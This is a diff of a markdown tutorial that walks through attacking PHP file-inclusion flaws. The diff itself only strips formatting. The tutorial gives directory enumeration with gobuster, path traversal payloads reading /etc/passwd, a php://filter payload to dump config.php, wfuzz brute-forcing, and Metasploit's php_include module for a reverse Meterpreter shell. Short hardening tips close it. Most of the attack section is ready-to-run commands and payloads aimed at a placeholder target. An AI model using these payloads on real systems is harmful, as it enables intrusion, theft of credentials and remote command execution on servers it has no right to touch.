@@ -79,46 +79,46 @@ If you want to **test LFI and RFI vulnerabilities**, you can use various **hacki
 
 ---
 
-## **1️ Detect LFI & RFI Using Gobuster**  
-### ** Gobuster for Directory & File Enumeration**
-First, use **Gobuster** to find **hidden directories** or vulnerable parameters.  
+## 1️ Detect LFI & RFI Using Gobuster
+###  Gobuster for Directory & File Enumeration
+First, use Gobuster to find hidden directories or vulnerable parameters.  
 
 ```bash
 gobuster dir -u http://target.com/ -w /usr/share/wordlists/dirb/common.txt -x php,txt
 ```
-✔ This helps find **files like `vulnerable.php`** that may be vulnerable to LFI/RFI.
+✔ This helps find files like `vulnerable.php` that may be vulnerable to LFI/RFI.
 
 ---
 
 ## 2️ Exploit LFI Using Burp Suite
-### ** Burp Suite to Test LFI Manually**
-1. Open **Burp Suite** → Turn on **Intercept**.
+###  Burp Suite to Test LFI Manually
+1. Open Burp Suite → Turn on **Intercept.
 2. Capture the request for `vulnerable.php?file=xyz`.
 3. Modify the parameter to test LFI:
    ```
    vulnerable.php?file=../../../../etc/passwd
    ```
-4. **Forward the request** → If successful, you'll see `/etc/passwd`.
+4. Forward the request → If successful, you'll see `/etc/passwd`.
 
-✔ You can also use **PHP Wrappers** for deeper exploitation:
+✔ You can also use PHP Wrappers for deeper exploitation:
 ```
 vulnerable.php?file=php://filter/convert.base64-encode/resource=config.php
 ```
-Then **decode the base64 output** to view sensitive information.
+Then decode the base64 output to view sensitive information.
 
 ---
 
 ## 3️ Exploit RFI Using Metasploit
-### ** Use Metasploit to Get a Reverse Shell**
+###  Use Metasploit to Get a Reverse Shell
 1. Start Metasploit:
    ```bash
    msfconsole
    ```
-2. Use the **RFI Exploit Module**:
+2. Use the RFI Exploit Module:
    ```bash
    use exploit/unix/webapp/php_include
    ```
-3. Set the **target URL**:
+3. Set the target URL:
    ```bash
    set TARGETURI /vulnerable.php?file=
    set RHOSTS target.com
@@ -127,34 +127,34 @@ Then **decode the base64 output** to view sensitive information.
    set LPORT 4444
    exploit
    ```
-✔ If successful, you will get a **Meterpreter shell**, allowing you to execute commands on the server!
+✔ If successful, you will get a Meterpreter shell, allowing you to execute commands on the server!
 
 ---
 
-## ** Automate LFI & RFI with Fuzzing**
-Use **wfuzz** to brute-force file inclusion:
+## Automate LFI & RFI with Fuzzing
+Use wfuzz to brute-force file inclusion:
 ```bash
 wfuzz -c -z file,/usr/share/wordlists/dirb/common.txt --hc=404 "http://target.com/vulnerable.php?file=FUZZ"
 ```
-✔ This will **find accessible files** and possible LFI/RFI entry points.
+✔ This will find accessible files and possible LFI/RFI entry points.
 
 ---
 
-## ** How to Stay Secure?**
-- **Sanitize user input** (use `basename()` and `realpath()`).
-- **Disable `allow_url_include`** in `php.ini`:
+##  How to Stay Secure?
+- Sanitize user input (use `basename()` and `realpath()`).
+- Disable `allow_url_include` in `php.ini`:
   ```ini
   allow_url_include = Off
   ```
-- **Use web application firewalls** (e.g., ModSecurity).
-- **Monitor logs** for suspicious requests.
+- Use web application firewalls (e.g., ModSecurity).
+- Monitor logs for suspicious requests.
 
 ---
 
 
-## ** 1️ Detect LFI & RFI Using Gobuster**  
-### ** Gobuster for Directory & File Enumeration**
-First, use **Gobuster** to find **hidden directories** or vulnerable parameters.  
+##  1️ Detect LFI & RFI Using Gobuster  
+###  Gobuster for Directory & File Enumeration
+First, use Gobuster to find hidden directories or vulnerable parameters.  
 
 ```bash
 gobuster dir -u http://target.com/ -w /usr/share/wordlists/dirb/common.txt -x php,txt
